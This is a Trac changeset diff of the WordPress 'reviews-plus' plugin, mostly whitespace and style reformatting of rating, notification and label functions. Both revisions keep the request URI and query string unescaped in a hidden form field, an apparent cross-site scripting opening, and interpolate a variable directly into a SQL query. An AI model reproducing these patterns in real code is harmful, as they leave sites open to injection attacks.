  | 344 |  | $html    .= sprintf( \_\_( 'Average Rating: <strong>%s out of %s</strong> (%s votes)', 'reviews-plus' ), $span1, $span2, $span3 ); |
  | 345 |  | } |
  | 346 |  | $html    .= '</span></div>'; |
  | 347 |  | $html    .= $reviews\_break; |
  | 348 |  | $html    .= '</div>'; |
  |  | 372 | $max         = $total\_summary \* 5; |
  |  | 373 | $total\_score = number\_format( ( $total\_achieved / $max ) \* 5, 1 ); |
  |  | 374 | $attr1       = ''; |
  |  | 375 | $attr2       = ''; |
  |  | 376 | $attr3       = ''; |
  |  | 377 | if ( ! empty( $attr ) ) { |
  |  | 378 | $attr1 = ' itemprop="ratingValue"'; |
  |  | 379 | $attr2 = ' itemprop="bestRating"'; |
  |  | 380 | $attr3 = ' itemprop="ratingCount"'; |
  |  | 381 | } |
  |  | 382 | $span1 = '<span' . $attr1 . '>' . $total\_score . '</span>'; |
  |  | 383 | $span2 = '<span' . $attr2 . '>5</span>'; |
  |  | 384 | $span3 = '<span' . $attr3 . '>' . $total\_summary . '</span>'; |
  |  | 385 | $html  .= sprintf( \_\_( 'Average Rating: <strong>%s out of %s</strong> (%s votes)', 'reviews-plus' ), $span1, $span2, $span3 ); |
  |  | 386 | $html  .= '</span></div>'; |
  |  | 387 | $html  .= $reviews\_break; |
  |  | 388 | $html  .= '</div>'; |
  |  | 389 |  |
  | 349 | 390 | return $html; |
  | 350 | 391 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L353) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L394) |  |
  | 353 | 394 |  |
  | 354 | 395 | function ic\_reviews\_structured\_data( $product\_id ) { |
  | 355 |  | $totals = ic\_get\_product\_review\_totals( $product\_id ); |
  | 356 |  | $total\_summary~~= $totals[ 'total'~~ ]; |
  |  | 396 | $totals        = ic\_get\_product\_review\_totals( $product\_id ); |
  |  | 397 | $total\_summary = $totals['total']; |
  | 357 | 398 | if ( empty( $total\_summary ) ) { |
  | 358 | 399 | return; |
  | 359 | 400 | } |
  | 360 |  | unset( $totals[~~'total'~~ ] ); |
  | 361 |  | unset( $totals[~~0~~ ] ); |
  | 362 |  | $max = $total\_summary \* 5; |
  | 363 |  | $total\_achieved = 0; |
  |  | 401 | unset( $totals['total'] ); |
  |  | 402 | unset( $totals[0] ); |
  |  | 403 | $max            = $total\_summary \* 5; |
  |  | 404 | $total\_achieved = 0; |
  | 364 | 405 | foreach ( $totals as $key => $total ) { |
  | 365 | 406 | if ( is\_numeric( $key ) ) { |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L367) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L408) |  |
  | 367 | 408 | } |
  | 368 | 409 | } |
  | 369 |  | $total\_score = number\_format( (~~$total\_achieved / $max~~) \* 5, 1 ); |
  |  | 410 | $total\_score = number\_format( ( $total\_achieved / $max ) \* 5, 1 ); |
  | 370 | 411 | echo '"aggregateRating":{ |
  | 371 | 412 | "@type":"AggregateRating", |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L380) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L421) |  |
  | 380 | 421 | \* |
  | 381 | 422 | \* @param type $key |
  |  | 423 | \* |
  | 382 | 424 | \* @return type |
  | 383 | 425 | \*/ |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L385) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L427) |  |
  | 385 | 427 | switch ( $key ) { |
  | 386 | 428 | case 1: |
  | 387 |  | $label = \_\_( '1 star', 'reviews-plus' ); |
  |  | 429 | $label = \_\_( '1 star', 'reviews-plus' ); |
  | 388 | 430 | break; |
  | 389 | 431 | case 2: |
  | 390 |  | $label = \_\_( '2 stars', 'reviews-plus' ); |
  |  | 432 | $label = \_\_( '2 stars', 'reviews-plus' ); |
  | 391 | 433 | break; |
  | 392 | 434 | case 3: |
  | 393 |  | $label = \_\_( '3 stars', 'reviews-plus' ); |
  |  | 435 | $label = \_\_( '3 stars', 'reviews-plus' ); |
  | 394 | 436 | break; |
  | 395 | 437 | case 4: |
  | 396 |  | $label = \_\_( '4 stars', 'reviews-plus' ); |
  |  | 438 | $label = \_\_( '4 stars', 'reviews-plus' ); |
  | 397 | 439 | break; |
  | 398 | 440 | case 5: |
  | 399 |  | $label = \_\_( '5 stars', 'reviews-plus' ); |
  |  | 441 | $label = \_\_( '5 stars', 'reviews-plus' ); |
  | 400 | 442 | break; |
  | 401 | 443 | } |
  |  | 444 |  |
  | 402 | 445 | return $label; |
  | 403 | 446 | } |
  | 404 | 447 |  |
  | 405 | 448 | function ic\_stars\_qty\_graph( $el\_total, $total ) { |
  | 406 |  | $html = ''; |
  | 407 |  | $percentage = 0; |
  | 408 |  | if ( !empty( $total ) ) { |
  | 409 |  | $percentage = number\_format( (~~$el\_total / $total~~) \* 100 ); |
  |  | 449 | $html       = ''; |
  |  | 450 | $percentage = 0; |
  |  | 451 | if ( ! empty( $total ) ) { |
  |  | 452 | $percentage = number\_format( ( $el\_total / $total ) \* 100 ); |
  | 410 | 453 | } |
  | 411 | 454 | $html = '<div class="graph-container"><span class="grey-graph"><span class="orange-graph" style="width:' . $percentage . '%"></span></span></div>'; |
  |  | 455 |  |
  | 412 | 456 | return $html; |
  | 413 | 457 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L415) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L459) |  |
  | 415 | 459 | function ic\_ic\_rev\_rating\_stars( $how\_many ) { |
  | 416 | 460 | $return = '<p class="review-rating" data-current\_rating="' . $how\_many . '">'; |
  | 417 |  | for ( $i = 1; $i <= $how\_many; $i++ ) { |
  |  | 461 | for ( $i = 1; $i <= $how\_many; $i ++ ) { |
  | 418 | 462 | $return .= '<span class="rating-on rate-' . $i . '" data-rating="' . $i . '"></span>'; |
  | 419 | 463 | } |
  | 420 | 464 | $return .= '</p>'; |
  |  | 465 |  |
  | 421 | 466 | return $return; |
  | 422 | 467 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L426) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L471) |  |
  | 426 | 471 | function ic\_revs\_comment\_redirect( $location ) { |
  | 427 | 472 | $location = str\_replace( 'comment', 'review', $location ); |
  | 428 |  | if ( !empty( $\_POST[ 'ic\_revs\_redirect' ] ) ) { |
  | 429 |  | $new         = explode( '#', $location ); |
  | 430 |  | $new[ 0 ]    = esc\_url( $\_POST[ 'ic\_revs\_redirect' ] ); |
  | 431 |  | $location    = $new[ 0 ] . '#' . $new[ 1 ]; |
  | 432 |  | } |
  |  | 473 | if ( ! empty( $\_POST['ic\_revs\_redirect'] ) ) { |
  |  | 474 | $new      = explode( '#', $location ); |
  |  | 475 | $new[0]   = esc\_url( $\_POST['ic\_revs\_redirect'] ); |
  |  | 476 | $location = $new[0] . '#' . $new[1]; |
  |  | 477 | } |
  |  | 478 |  |
  | 433 | 479 | return $location; |
  | 434 | 480 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L450) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L496) |  |
  | 450 | 496 | \* @param type $notify |
  | 451 | 497 | \* @param type $comment\_id |
  |  | 498 | \* |
  | 452 | 499 | \* @return boolean |
  | 453 | 500 | \*/ |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L458) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L505) |  |
  | 458 | 505 | } |
  | 459 | 506 | } |
  |  | 507 |  |
  | 460 | 508 | return $notify; |
  | 461 | 509 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L469) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L517) |  |
  | 469 | 517 | \* @param type $emails |
  | 470 | 518 | \* @param type $comment\_id |
  |  | 519 | \* |
  | 471 | 520 | \* @return type |
  | 472 | 521 | \*/ |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L475) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L524) |  |
  | 475 | 524 |  |
  | 476 | 525 | } |
  |  | 526 |  |
  | 477 | 527 | return $emails; |
  | 478 | 528 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L485) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L535) |  |
  | 485 | 535 | \* @param type $text |
  | 486 | 536 | \* @param type $comment\_id |
  |  | 537 | \* |
  | 487 | 538 | \* @return type |
  | 488 | 539 | \*/ |
  | 489 | 540 | function ic\_review\_notification\_text( $notify\_message, $comment\_id ) { |
  | 490 | 541 | if ( is\_ic\_review\_comment( $comment\_id ) ) { |
  | 491 |  | $comment = get\_comment( $comment\_id ); |
  | 492 |  | $product\_name = ic\_get\_review\_product\_name( $comment\_id ); |
  | 493 |  | $notify\_message = sprintf( \_\_( 'New review on %s' ), $product\_name ) . "\r\n"; |
  |  | 542 | $comment        = get\_comment( $comment\_id ); |
  |  | 543 | $product\_name   = ic\_get\_review\_product\_name( $comment\_id ); |
  |  | 544 | $notify\_message = sprintf( \_\_( 'New review on %s' ), $product\_name ) . "\r\n"; |
  | 494 | 545 | /\* translators: 1: comment author, 2: author IP, 3: author domain \*/ |
  | 495 |  | $comment\_author\_domain = @gethostbyaddr( $comment->comment\_author\_IP ); |
  | 496 |  | $notify\_message .= sprintf( \_\_( 'Author: %1$s (IP: %2$s, %3$s)' ), $comment->comment\_author, $comment->comment\_author\_IP, $comment\_author\_domain ) . "\r\n"; |
  | 497 |  | $notify\_message .= sprintf( \_\_( 'Email: %s' ), $comment->comment\_author\_email ) . "\r\n"; |
  |  | 546 | $comment\_author\_domain = @gethostbyaddr( $comment->comment\_author\_IP ); |
  |  | 547 | $notify\_message        .= sprintf( \_\_( 'Author: %1$s (IP: %2$s, %3$s)' ), $comment->comment\_author, $comment->comment\_author\_IP, $comment\_author\_domain ) . "\r\n"; |
  |  | 548 | $notify\_message        .= sprintf( \_\_( 'Email: %s' ), $comment->comment\_author\_email ) . "\r\n"; |
  | 498 | 549 | //$notify\_message .= sprintf( \_\_( 'URL: %s' ), $comment->comment\_author\_url ) . "\r\n"; |
  | 499 |  | $review\_content = wp\_specialchars\_decode( $comment->comment\_content ); |
  | 500 |  | $notify\_message .= sprintf( \_\_( 'Review: %s' ), "\r\n" . $review\_content ) . "\r\n\r\n"; |
  | 501 |  | $post\_type = get\_post\_type( $comment->comment\_post\_ID ); |
  | 502 |  | $post\_type\_o = get\_post\_type\_object( $post\_type ); |
  | 503 |  | $notify\_message .= sprintf( \_\_( 'You can see all reviews on this %s here:' ), $post\_type\_o->labels->singular\_name ) . "\r\n"; |
  | 504 |  | $notify\_message .= get\_permalink( $comment->comment\_post\_ID ) . "#reviews\r\n\r\n"; |
  | 505 |  | $notify\_message .= sprintf( \_\_( 'Permalink: %s' ), get\_comment\_link( $comment ) ) . "\r\n"; |
  |  | 550 | $review\_content = wp\_specialchars\_decode( $comment->comment\_content ); |
  |  | 551 | $notify\_message .= sprintf( \_\_( 'Review: %s' ), "\r\n" . $review\_content ) . "\r\n\r\n"; |
  |  | 552 | $post\_type      = get\_post\_type( $comment->comment\_post\_ID ); |
  |  | 553 | $post\_type\_o    = get\_post\_type\_object( $post\_type ); |
  |  | 554 | $notify\_message .= sprintf( \_\_( 'You can see all reviews on this %s here:' ), $post\_type\_o->labels->singular\_name ) . "\r\n"; |
  |  | 555 | $notify\_message .= get\_permalink( $comment->comment\_post\_ID ) . "#reviews\r\n\r\n"; |
  |  | 556 | $notify\_message .= sprintf( \_\_( 'Permalink: %s' ), get\_comment\_link( $comment ) ) . "\r\n"; |
  | 506 | 557 | /\* |
  | 507 | 558 | $post                  = get\_post( $comment->comment\_post\_ID ); |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L517) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L568) |  |
  | 517 | 568 | \*/ |
  | 518 | 569 | } |
  |  | 570 |  |
  | 519 | 571 | return $notify\_message; |
  | 520 | 572 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L527) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L579) |  |
  | 527 | 579 | \* @param type $subject |
  | 528 | 580 | \* @param type $comment\_id |
  |  | 581 | \* |
  | 529 | 582 | \* @return type |
  | 530 | 583 | \*/ |
  | 531 | 584 | function ic\_review\_notification\_subject( $subject, $comment\_id ) { |
  | 532 | 585 | if ( is\_ic\_review\_comment( $comment\_id ) ) { |
  | 533 |  | $blogname    = wp\_specialchars\_decode( get\_option( 'blogname' ), ENT\_QUOTES ); |
  | 534 |  | $subject     = sprintf( \_\_( '[%1$s] Review: "%2$s"' ), $blogname, ic\_get\_review\_product\_name( $comment\_id ) ); |
  | 535 |  | } |
  |  | 586 | $blogname = wp\_specialchars\_decode( get\_option( 'blogname' ), ENT\_QUOTES ); |
  |  | 587 | $subject  = sprintf( \_\_( '[%1$s] Review: "%2$s"' ), $blogname, ic\_get\_review\_product\_name( $comment\_id ) ); |
  |  | 588 | } |
  |  | 589 |  |
  | 536 | 590 | return $subject; |
  | 537 | 591 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L544) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L598) |  |
  | 544 | 598 | \* @param type $text |
  | 545 | 599 | \* @param type $comment\_id |
  |  | 600 | \* |
  | 546 | 601 | \* @return type |
  | 547 | 602 | \*/ |
  | 548 | 603 | function ic\_review\_moderation\_text( $notify\_message, $comment\_id ) { |
  | 549 | 604 | if ( is\_ic\_review\_comment( $comment\_id ) ) { |
  | 550 |  | $comment = get\_comment( $comment\_id ); |
  | 551 |  | $product\_name = ic\_get\_review\_product\_name( $comment\_id ); |
  | 552 |  | $notify\_message = sprintf( \_\_( 'A new review on the %s is waiting for your approval' ), $product\_name ) . "\r\n"; |
  | 553 |  | $notify\_message .= get\_permalink( $comment->comment\_post\_ID ) . "\r\n\r\n"; |
  | 554 |  | $comment\_author\_domain = @gethostbyaddr( $comment->comment\_author\_IP ); |
  | 555 |  | $notify\_message .= sprintf( \_\_( 'Author: %1$s (IP: %2$s, %3$s)' ), $comment->comment\_author, $comment->comment\_author\_IP, $comment\_author\_domain ) . "\r\n"; |
  | 556 |  | $notify\_message .= sprintf( \_\_( 'Email: %s' ), $comment->comment\_author\_email ) . "\r\n"; |
  |  | 605 | $comment               = get\_comment( $comment\_id ); |
  |  | 606 | $product\_name          = ic\_get\_review\_product\_name( $comment\_id ); |
  |  | 607 | $notify\_message        = sprintf( \_\_( 'A new review on the %s is waiting for your approval' ), $product\_name ) . "\r\n"; |
  |  | 608 | $notify\_message        .= get\_permalink( $comment->comment\_post\_ID ) . "\r\n\r\n"; |
  |  | 609 | $comment\_author\_domain = @gethostbyaddr( $comment->comment\_author\_IP ); |
  |  | 610 | $notify\_message        .= sprintf( \_\_( 'Author: %1$s (IP: %2$s, %3$s)' ), $comment->comment\_author, $comment->comment\_author\_IP, $comment\_author\_domain ) . "\r\n"; |
  |  | 611 | $notify\_message        .= sprintf( \_\_( 'Email: %s' ), $comment->comment\_author\_email ) . "\r\n"; |
  | 557 | 612 | //$notify\_message .= sprintf( \_\_( 'URL: %s' ), $comment->comment\_author\_url ) . "\r\n"; |
  | 558 |  | $review\_content = wp\_specialchars\_decode( $comment->comment\_content ); |
  | 559 |  | $notify\_message .= sprintf( \_\_( 'Review: %s' ), "\r\n" . $review\_content ) . "\r\n\r\n"; |
  |  | 613 | $review\_content = wp\_specialchars\_decode( $comment->comment\_content ); |
  |  | 614 | $notify\_message .= sprintf( \_\_( 'Review: %s' ), "\r\n" . $review\_content ) . "\r\n\r\n"; |
  | 560 | 615 | /\* |
  | 561 | 616 | \* NEEDS IMPROVEMENTS ON THE FUNCTIONALITY AFTER CLICKING ON IT |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L570) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L625) |  |
  | 570 | 625 | \*/ |
  | 571 | 626 | global $wpdb; |
  | 572 |  | $comment\_type            = get\_comment\_type( $comment\_id ); |
  | 573 |  | $post\_type               = get\_post\_type( $comment->comment\_post\_ID ); |
  | 574 |  | $reviews\_waiting         = $wpdb->get\_var( "SELECT count(comment\_ID) FROM $wpdb->comments WHERE comment\_approved = '0' AND comment\_type = '$comment\_type'" ); |
  | 575 |  | $notify\_message          .= sprintf( \_n( 'Currently %s review is waiting for approval. Please visit the moderation panel:', 'Currently %s reviews are waiting for approval. Please visit the moderation panel:', $reviews\_waiting ), number\_format\_i18n( $reviews\_waiting ) ) . "\r\n"; |
  | 576 |  | $notify\_message          .= admin\_url( "edit.php?post\_type=" . $post\_type . "&page=ic\_reviews\_" . $post\_type . "&comment\_type=" . $comment\_type . "&comment\_status=moderated#wpbody-content" ) . "\r\n"; |
  | 577 |  | } |
  |  | 627 | $comment\_type    = get\_comment\_type( $comment\_id ); |
  |  | 628 | $post\_type       = get\_post\_type( $comment->comment\_post\_ID ); |
  |  | 629 | $reviews\_waiting = $wpdb->get\_var( "SELECT count(comment\_ID) FROM $wpdb->comments WHERE comment\_approved = '0' AND comment\_type = '$comment\_type'" ); |
  |  | 630 | $notify\_message  .= sprintf( \_n( 'Currently %s review is waiting for approval. Please visit the moderation panel:', 'Currently %s reviews are waiting for approval. Please visit the moderation panel:', $reviews\_waiting ), number\_format\_i18n( $reviews\_waiting ) ) . "\r\n"; |
  |  | 631 | $notify\_message  .= admin\_url( "edit.php?post\_type=" . $post\_type . "&page=ic\_reviews\_" . $post\_type . "&comment\_type=" . $comment\_type . "&comment\_status=moderated#wpbody-content" ) . "\r\n"; |
  |  | 632 | } |
  |  | 633 |  |
  | 578 | 634 | return $notify\_message; |
  | 579 | 635 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L586) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L642) |  |
  | 586 | 642 | \* @param type $subject |
  | 587 | 643 | \* @param type $comment\_id |
  |  | 644 | \* |
  | 588 | 645 | \* @return type |
  | 589 | 646 | \*/ |
  | 590 | 647 | function ic\_review\_moderation\_subject( $subject, $comment\_id ) { |
  | 591 | 648 | if ( is\_ic\_review\_comment( $comment\_id ) ) { |
  | 592 |  | $blogname    = wp\_specialchars\_decode( get\_option( 'blogname' ), ENT\_QUOTES ); |
  | 593 |  | $subject     = sprintf( \_\_( '[%1$s] Please moderate review of %2$s' ), $blogname, ic\_get\_review\_product\_name( $comment\_id ) ); |
  | 594 |  | } |
  |  | 649 | $blogname = wp\_specialchars\_decode( get\_option( 'blogname' ), ENT\_QUOTES ); |
  |  | 650 | $subject  = sprintf( \_\_( '[%1$s] Please moderate review of %2$s' ), $blogname, ic\_get\_review\_product\_name( $comment\_id ) ); |
  |  | 651 | } |
  |  | 652 |  |
  | 595 | 653 | return $subject; |
  | 596 | 654 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L600) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L658) |  |
  | 600 | 658 | \* |
  | 601 | 659 | \* @param type $review\_id |
  |  | 660 | \* |
  | 602 | 661 | \* @return type |
  | 603 | 662 | \*/ |
  | 604 | 663 | function ic\_get\_review\_product\_name( $review\_id ) { |
  | 605 | 664 | $comment = get\_comment( $review\_id ); |
  | 606 |  | $post    = get\_post( $comment->comment\_post\_ID ); |
  |  | 665 | $post    = get\_post( $comment->comment\_post\_ID ); |
  |  | 666 |  |
  | 607 | 667 | return $post->post\_title; |
  | 608 | 668 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L611) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L671) |  |
  | 611 | 671 |  |
  | 612 | 672 | function ic\_revs\_force\_open( $open, $post\_id ) { |
  | 613 |  | $post\_type = get\_post\_type( $post\_id ); |
  | 614 |  | $show\_where = get\_ic\_review\_show\_where\_post\_types(); |
  | 615 |  | if ( !empty( $show\_where[ $post\_type ] ) && $show\_where[ $post\_type ] === 'all' ) { |
  |  | 673 | $post\_type  = get\_post\_type( $post\_id ); |
  |  | 674 | $show\_where = get\_ic\_review\_show\_where\_post\_types(); |
  |  | 675 | if ( ! empty( $show\_where[ $post\_type ] ) && $show\_where[ $post\_type ] === 'all' ) { |
  | 616 | 676 | return true; |
  | 617 | 677 | } |
  |  | 678 |  |
  | 618 | 679 | return $open; |
  | 619 | 680 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L623) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L684) |  |
  | 623 | 684 | function ic\_reviews\_labels\_settings( $single\_names ) { |
  | 624 | 685 | ?> |
  | 625 |  | <tr><td><?php \_e( 'Reviews Header', 'reviews-plus' ); ?></td><td><input type="text" name="single\_names[reviews]" value="<?php echo esc\_html( $single\_names[ 'reviews' ] ); ?>" /></td></tr> |
  | 626 |  | <tr><td><?php \_e( 'Rating Title', 'reviews-plus' ); ?></td><td><input type="text" name="single\_names[rating\_tite]" value="<?php echo esc\_html( $single\_names[ 'rating\_tite' ] ); ?>" /></td></tr> |
  | 627 |  | <tr><td><?php \_e( 'Review title label', 'reviews-plus' ); ?></td><td><input type="text" name="single\_names[review\_title]" value="<?php echo esc\_html( $single\_names[ 'review\_title' ] ); ?>" /></td></tr> |
  | 628 |  | <tr><td><?php \_e( 'Review text label', 'reviews-plus' ); ?></td><td><input type="text" name="single\_names[review\_text]" value="<?php echo esc\_html( $single\_names[ 'review\_text' ] ); ?>" /></td></tr> |
  | 629 |  | <tr><td><?php \_e( 'Closed Reviews', 'reviews-plus' ); ?></td><td><input type="text" name="single\_names[reviews\_closed]" value="<?php echo esc\_html( $single\_names[ 'reviews\_closed' ] ); ?>" /></td></tr> |
  | 630 |  | <tr><td><?php \_e( 'Review Reply Title', 'reviews-plus' ); ?></td><td><input type="text" name="single\_names[review\_reply\_title]" value="<?php echo esc\_html( $single\_names[ 'review\_reply\_title' ] ); ?>" /></td></tr> |
  | 631 |  | <tr><td><?php \_e( 'Review Submit Label', 'reviews-plus' ); ?></td><td><input type="text" name="single\_names[review\_submit\_label]" value="<?php echo esc\_html( $single\_names[ 'review\_submit\_label' ] ); ?>" /></td></tr> |
  |  | 686 | <tr> |
  |  | 687 | <td><?php \_e( 'Reviews Header', 'reviews-plus' ); ?></td> |
  |  | 688 | <td><input type="text" name="single\_names[reviews]" |
  |  | 689 | value="<?php echo esc\_html( $single\_names['reviews'] ); ?>"/></td> |
  |  | 690 | </tr> |
  |  | 691 | <tr> |
  |  | 692 | <td><?php \_e( 'Rating Title', 'reviews-plus' ); ?></td> |
  |  | 693 | <td><input type="text" name="single\_names[rating\_tite]" |
  |  | 694 | value="<?php echo esc\_html( $single\_names['rating\_tite'] ); ?>"/></td> |
  |  | 695 | </tr> |
  |  | 696 | <tr> |
  |  | 697 | <td><?php \_e( 'Review title label', 'reviews-plus' ); ?></td> |
  |  | 698 | <td><input type="text" name="single\_names[review\_title]" |
  |  | 699 | value="<?php echo esc\_html( $single\_names['review\_title'] ); ?>"/></td> |
  |  | 700 | </tr> |
  |  | 701 | <tr> |
  |  | 702 | <td><?php \_e( 'Review text label', 'reviews-plus' ); ?></td> |
  |  | 703 | <td><input type="text" name="single\_names[review\_text]" |
  |  | 704 | value="<?php echo esc\_html( $single\_names['review\_text'] ); ?>"/></td> |
  |  | 705 | </tr> |
  |  | 706 | <tr> |
  |  | 707 | <td><?php \_e( 'Closed Reviews', 'reviews-plus' ); ?></td> |
  |  | 708 | <td><input type="text" name="single\_names[reviews\_closed]" |
  |  | 709 | value="<?php echo esc\_html( $single\_names['reviews\_closed'] ); ?>"/></td> |
  |  | 710 | </tr> |
  |  | 711 | <tr> |
  |  | 712 | <td><?php \_e( 'Review Reply Title', 'reviews-plus' ); ?></td> |
  |  | 713 | <td><input type="text" name="single\_names[review\_reply\_title]" |
  |  | 714 | value="<?php echo esc\_html( $single\_names['review\_reply\_title'] ); ?>"/></td> |
  |  | 715 | </tr> |
  |  | 716 | <tr> |
  |  | 717 | <td><?php \_e( 'Review Submit Label', 'reviews-plus' ); ?></td> |
  |  | 718 | <td><input type="text" name="single\_names[review\_submit\_label]" |
  |  | 719 | value="<?php echo esc\_html( $single\_names['review\_submit\_label'] ); ?>"/></td> |
  |  | 720 | </tr> |
  | 632 | 721 | <?php |
  | 633 | 722 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L639) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L728) |  |
  | 639 | 728 | $labels = ic\_reviews\_standard\_labels(); |
  | 640 | 729 | } |
  |  | 730 |  |
  | 641 | 731 | return $labels; |
  | 642 | 732 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L645) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L735) |  |
  | 645 | 735 |  |
  | 646 | 736 | function ic\_reviews\_standard\_labels( $single\_names = array() ) { |
  | 647 |  | $single\_names[ 'reviews' ]               = \_\_( 'Reviews', 'reviews-plus' ); |
  | 648 |  | $single\_names[ 'rating\_tite' ]           = \_\_( 'Your Rating', 'reviews-plus' ); |
  | 649 |  | $single\_names[ 'review\_title' ]          = \_\_( 'Your Review Title', 'reviews-plus' ); |
  | 650 |  | $single\_names[ 'review\_text' ]           = \_\_( 'Your Review', 'reviews-plus' ); |
  | 651 |  | $single\_names[ 'reviews\_closed' ]        = \_\_( 'Reviews are closed.', 'reviews-plus' ); |
  | 652 |  | $single\_names[ 'review\_reply\_title' ]    = sprintf( \_\_( 'Review %s.', 'reviews-plus' ), '[product\_name]' ); |
  | 653 |  | $single\_names[ 'review\_submit\_label' ]   = \_\_( 'Submit Review', 'reviews-plus' ); |
  |  | 737 | $single\_names['reviews']             = \_\_( 'Reviews', 'reviews-plus' ); |
  |  | 738 | $single\_names['rating\_tite']         = \_\_( 'Your Rating', 'reviews-plus' ); |
  |  | 739 | $single\_names['review\_title']        = \_\_( 'Your Review Title', 'reviews-plus' ); |
  |  | 740 | $single\_names['review\_text']         = \_\_( 'Your Review', 'reviews-plus' ); |
  |  | 741 | $single\_names['reviews\_closed']      = \_\_( 'Reviews are closed.', 'reviews-plus' ); |
  |  | 742 | $single\_names['review\_reply\_title']  = sprintf( \_\_( 'Review %s.', 'reviews-plus' ), '[product\_name]' ); |
  |  | 743 | $single\_names['review\_submit\_label'] = \_\_( 'Submit Review', 'reviews-plus' ); |
  |  | 744 |  |
  | 654 | 745 | return $single\_names; |
  | 655 | 746 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L658) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L749) |  |
  | 658 | 749 |  |
  | 659 | 750 | function ic\_reviews\_add\_shortcodes() { |
  | 660 |  | if ( !shortcode\_exists( 'product\_name' ) ) { |
  |  | 751 | if ( ! shortcode\_exists( 'product\_name' ) ) { |
  | 661 | 752 | add\_shortcode( 'product\_name', 'get\_the\_title' ); |
  | 662 | 753 | } |
* ## [reviews-plus/trunk/includes/includes.php](/changeset/2618234/reviews-plus/trunk/includes/includes.php "Show the changeset 2618234 restricted to reviews-plus/trunk/includes/includes.php")

  | [r2419309](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L1 "Show revision 2419309 of this file in browser") | [r2618234](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L1 "Show revision 2618234 of this file in browser") |  |
  | --- | --- | --- |
  | 1 | 1 | <?php |
  | 2 |  | if ( !defined( 'ABSPATH' ) ) { |
  |  | 2 | if ( ! defined( 'ABSPATH' ) ) { |
  | 3 | 3 | exit; // Exit if accessed directly |
  | 4 | 4 | } |
  | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2419309#L34) | […](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234#L34) |  |
  | 34 | 34 | \*/ |
  | 35 | 35 | function ic\_reviews\_form( $post\_id = null, $post\_type = null ) { |
  | 36 |  | if ( empty( $post\_type ) && !empty( $post\_id ) ) { |
  |  | 36 | if ( empty( $post\_type ) && ! empty( $post\_id ) ) { |
  | 37 | 37 | $post\_type = get\_post\_type( $post\_id ); |
  | 38 | 38 | } |
  | 39 |  | $comment\_type = ic\_get\_comment\_type( $post\_id, $post\_type ); |
  |  | 39 | $comment\_type = ic\_get\_comment\_type( $post\_id, $post\_type ); |
  | 40 | 40 | add\_filter( 'comment\_form\_default\_fields', 'ic\_revs\_default\_fields' ); |
  | 41 |  | $redirect = ''; |
  | 42 |  | $labels = ic\_get\_reviews\_labels(); |
  | 43 |  | if ( !empty( $post\_id ) ) { |
  | 44 |  | $redirect = '<input type="hidden" name="ic\_revs\_redirect" value="' . $\_SERVER[~~'REQUEST\_URI' ] . $\_SERVER[ 'QUERY\_STRING'~~ ] . '">'; |
  |  | 41 | $redirect = ''; |
  |  | 42 | $labels   = ic\_get\_reviews\_labels(); |
  |  | 43 | if ( ! empty( $post\_id ) ) { |
  |  | 44 | $redirect = '<input type="hidden" name="ic\_revs\_redirect" value="' . $\_SERVER['REQUEST\_URI'] . $\_SERVER['QUERY\_STRING'] . '">'; |
  | 45 | 45 | } |
  | 46 | 46 | comment\_form( array( |
  | 47 |  | 'comment\_notes\_after' => ' ', |
  | 48 |  | 'title\_reply'~~=> do\_shortcode( $labels[ 'review\_reply\_title'~~ ] ), |
  | 49 |  | 'must\_log\_in' => '<p class="must-log-in">' . sprintf( |
  | 50 |  | /\* translators: %s: login URL \*/ |
